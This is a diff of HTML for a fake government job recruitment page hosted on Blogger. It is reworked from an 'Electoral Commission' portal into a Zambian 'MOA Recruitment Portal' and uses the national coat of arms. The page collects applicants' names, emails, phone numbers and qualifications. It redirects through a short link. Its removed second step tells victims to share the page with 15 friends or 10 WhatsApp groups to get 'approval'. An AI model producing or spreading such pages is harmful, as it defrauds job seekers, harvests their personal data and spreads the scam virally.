@@ -449,43 +449,43 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
       .application-form { padding: 18px; }
       .pulse-btn { font-size: 1rem; padding: 16px 26px; }
     }
-  </style>
-<link rel="me" href="https://draft.blogger.com/profile/16737217849288108359" />
+   </style>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 <body>
   <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-box">
-      <div class="spinner"></div>
+      <div class="loader"></div>
       <p>Loading, please wait...</p>
     </div>
   </div>
 
   <main class="page">
-    <section class="shell">
-      <header class="topbar">
-        <div class="topbar-logo">
-          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9K3QQNC_7FOj9ZkOotrIkqqWImjjTXLG56A&s" alt="Logo">
-        </div>
-        <div class="topbar-title">Electoral Commission Recruitment Portal</div>
-        <div class="topbar-spacer"></div>
-      </header>
+    <section class="portal-card">
+      <header class="header">
+  <div class="header-logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/28/Coat_of_arms_of_Zambia.svg/1280px-Coat_of_arms_of_Zambia.svg.png" alt="UN">
+  </div>
+  <div class="header-title">MOA-Recruitment Portal</div>
+  <div class="header-spacer"></div>
+</header>
 
-      <section class="step active" id="step1">
-        <div class="banner">
-          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9K3QQNC_7FOj9ZkOotrIkqqWImjjTXLG56A&s" alt="Banner">
+      <section id="step1" class="step active">
+        <div class="hero-image-wrap">
+          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgo1hIw-LZDulz04KZ0vaxRN1c8APVKyFfgM-cRTqUiPY276IE252IQILI09SHj6kDbmHt2NGSUZNG-eMxRNRoDabXrGRLeu0L6suaeVY6n-Akrct-RB9yKykZe9dlG3fOK2iCEYeT8oI3YVss7DCg7Ar9xTWKKt5Qs8tgWcwp99CF24Y2s6AT3tSz3Zpw/s940/REPUBLIC%20OF%20ZAMBIA.png" alt="UN" width="100%" height="35%">
         </div>
 
-        <h1 class="heading">Complete Your Application</h1>
-        <p class="subheading">Fill in your details below to proceed to the verification step.</p>
+        <h1 class="section-title">Welcome to the MOA Recruitment Portal</h1>
+        <p class="section-subtitle">To start your application. Click <b>APPLY NOW</b> and fill out the form below correctly.</p>
 
         <div class="form-shell">
-          <div class="overlay" id="formOverlay">
-            <button type="button" class="pulse-btn" id="applyNowBtn">APPLY NOW</button>
+          <div class="form-overlay" id="formOverlay">
+            <button class="pulse-btn" id="applyNowBtn" type="button">APPLY NOW</button>
           </div>
 
-          <form class="card application-form locked" id="applicationForm">
+          <form class="application-form locked" id="applicationForm">
             <div class="field-grid">
               <div class="field">
                 <label for="fullName">Full Name</label>
@@ -494,22 +494,19 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
 
               <div class="field">
                 <label for="email">Email Address</label>
-                <input type="email" id="email" placeholder="Enter your email address">
+                <input type="email" id="email" placeholder="Enter your email">
               </div>
 
               <div class="field">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="Enter your phone number">
+                <input type="tel" id="phone" placeholder="+260">
               </div>
 
               <div class="field">
                 <label for="position">Position</label>
                 <select id="position">
                   <option value="">Select position</option>
-                  <option value="Registration Officer">Registration Officer</option>
-                  <option value="Presiding Officer">Presiding Officer</option>
-                  <option value="Data Entry Officer">Data Entry Officer</option>
-                  <option value="Administrative Assistant">Administrative Assistant</option>
+                  <option value="Presiding Officer">Agricultural Extension Officer</option>
                 </select>
               </div>
 
@@ -519,8 +516,8 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
               </div>
 
               <div class="field">
-                <label for="county">County Applying From</label>
-                <input type="text" id="county" placeholder="Enter your county">
+                <label for="county">Province Applying From</label>
+                <input type="text" id="Province" placeholder="Enter your county">
               </div>
 
               <div class="field">
@@ -536,44 +533,17 @@ location.href='https://rebrand.ly/Agric-Zm-Recruitment-2026';
                 <label for="qualification">Educational Qualification</label>
                 <select id="qualification">
                   <option value="">Select qualification</option>
-                  <option value="Certificate">Certificate</option>
-                  <option value="Diploma">Diploma</option>
-                  <option value="Degree">Degree</option>
-                  <option value="Masters">Masters</option>
+                  <option value="KCSE">Primary School Certificate (Grade 7)</option>
+                  <option value="Certificate">Junior Secondary School Leaving Certificate (Grade 9)</option>
+                  <option value="Diploma">School Certificate / GCE (Grade 12)</option>
+                  <option value="Other">Other</option>
                 </select>
               </div>
             </div>
 
-            <button type="button" class="btn btn-primary" id="proceedBtn">PROCEED</button>
-            <p class="error" id="formError">Please complete all fields before proceeding.</p>
+            <button class="primary-btn" id="proceedBtn" type="button">PROCEED</button>
+            <p class="error-text" id="formError">Please complete all fields before proceeding.</p>
           </form>
-        </div>
-      </section>
-
-      <section id="step2" class="step">
-        <div class="top-message">Congratulations! Your application has been successfully received.<br> To change application status to approved please follow the steps below</div>
-
-        <div class="status-grid">
-          <div class="status-box status-pending">STATUS: PENDING</div>
-          <div class="status-box status-approval" id="approvalBox">APPROVAL: WAITING</div>
-        </div>
-
-        <div class="instruction-card">
-          <h3>Important Instructions</h3>
-          <p><strong>Rule 1:</strong> To support wider public awareness, kindly share this opportunity with 15 friends or 10 WhatsApp groups. Click the <b>“SHARE ON WHATSAPP”<b> button below to continue...</p>
-          <p><strong>Rule 2:</strong> Treat this as important. High sharing activity increases your approval priority. Once finished, you will be automatically redirected to the submission page.</p>
-        </div>
-
-        <a href="#" class="whatsapp-btn" id="whatsappShareBtn" target="_blank" rel="noopener noreferrer">SHARE ON WHATSAPP</a>
-
-        <div class="progress-area">
-          <div class="progress-head">
-            <span>Share Progress</span>
-            <span id="progressText">0%</span>
-          </div>
-          <div class="progress-track">
-            <div class="progress-fill" id="progressFill"></div>
-          </div>
         </div>
       </section>
 
